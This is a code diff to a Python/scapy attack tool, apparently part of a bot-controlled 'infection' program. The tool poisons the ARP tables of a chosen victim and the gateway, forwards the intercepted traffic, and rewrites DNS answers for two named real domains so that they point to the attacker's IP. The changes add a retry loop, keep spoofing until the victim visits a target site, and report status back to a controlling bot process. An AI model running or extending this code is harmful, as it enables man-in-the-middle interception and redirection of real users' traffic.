@@ -100,10 +100,12 @@ def scan_host(host):
     packet = ether_layer / arp_layer
     result = ""
     host_mac = ""
+    try_count = 0
 
     # keep sending arp packets until it receives an answer
-    while len(result) == 0:
+    while len(result) == 0 and try_count != 5:
         result = srp(packet, timeout=3, verbose=0)[0]
+        try_count += 1
 
     for sent, received in result:
         host_mac = received.hwsrc
@@ -112,10 +114,11 @@ def scan_host(host):
 
 
 # spoofing the arp tables of the victim and the gateway
-def arp_spoof(chosen_ip, gateway_ip, my_mac, victim_mac, gateway_mac):
+def arp_spoof(chosen_ip, gateway_ip, my_mac, victim_mac, gateway_mac, conn):
+    global spoofed, finish
     end = time.time() + 3 * 60
-    # attack again to remain in the middle
-    while time.time() < end:
+    # attack again to remain in the middle until the victim has entered the website
+    while not spoofed:
         try:
             # op 2 - is_at , sending to the victim ARP packet with my mac attached to the gateway ip
             arp_packet = ARP(op=2, pdst=chosen_ip, psrc=gateway_ip, hwsrc=my_mac, hwdst=victim_mac)
@@ -125,14 +128,18 @@ def arp_spoof(chosen_ip, gateway_ip, my_mac, victim_mac, gateway_mac):
             send(arp_packet, verbose=0)
             time.sleep(3)
         except Exception as ex:
-            print(str(ex))
-    print("spof")
+            conn.send(str(ex))
+    time.sleep(5)   # should be 30
+    # stop the ip forwarding and the spoofing
+    finish = True
+    conn.send("finished spoofing")
     return
 
 
-# forwards the packets to their normal addresses
+# forwards the packets to their normal addresses until the victim went to the website
 def packets_forwarding():
-    sniff(prn=forward, lfilter=filter_packets, store=0)
+    global finish
+    sniff(prn=forward, lfilter=filter_packets, store=0, stop_filter=lambda x: finish)
     return
 
 
@@ -169,11 +176,11 @@ def filter_packets(packet):
 
 # changing the DNS answer for a specific domain
 def change_packet(pkt):
+    global spoofed
     # get the real name of the query
     real_name = pkt[DNSQR].qname.decode()[:-1]
     fake_ip = ip
     # if the victim entered the given website, change the packet
-    spoofed = False
     print(real_name)
     if real_name in ["www.rabincenter.org.il", "www.sribersriber.com"]:
         spoofed = True
@@ -192,13 +199,15 @@ def change_packet(pkt):
 
 
 def main_infect(conn):
-    global ip, my_mac, gateway_mac, chosen_ip, chosen_mac, gateway_mac, sock
+    global ip, my_mac, gateway_mac, chosen_ip, chosen_mac, gateway_mac, sock, spoofed, finish
     ip, subnet, default_gate = get_configs()
     time.sleep(1)
     gateway_mac = scan_host(default_gate)
     my_mac = ARP().hwsrc
     # creating a single socket for all the packets that scapy send
     sock = conf.L2socket()
+    spoofed = False
+    finish = False
     while True:
         # waiting for infecting commands from the bot process
         command = conn.recv()
@@ -218,21 +227,24 @@ def main_infect(conn):
                 chosen_mac = scan_host(chosen_ip)
                 conn.send(chosen_mac)
 
-            else:
+            elif command.find("spoof") != -1:
+                chosen_ip = conn.recv()
+                chosen_mac = conn.recv()
+                if not chosen_mac:
+                    chosen_mac = scan_host(chosen_ip)
                 if chosen_mac:
                     try:
                         # creates a spoofing thread
                         spoof_thread = threading.Thread(target=arp_spoof,
-                                                        args=(chosen_ip, default_gate,
-                                                              my_mac, chosen_mac, gateway_mac,))
+                                                            args=(chosen_ip, default_gate,
+                                                                  my_mac, chosen_mac, gateway_mac,conn, ))
                         spoof_thread.start()
 
                         # creates a ip forwarding thread
                         forwarding_thread = threading.Thread(target=packets_forwarding)
                         forwarding_thread.start()
-
                     except Exception as e:
-                        print("finish " + str(e))
-                    else:
-                        print("Doesnt have mac")
+                        conn.send(str(e))
+                else:
+                    conn.send("Doesn't have mac")
 
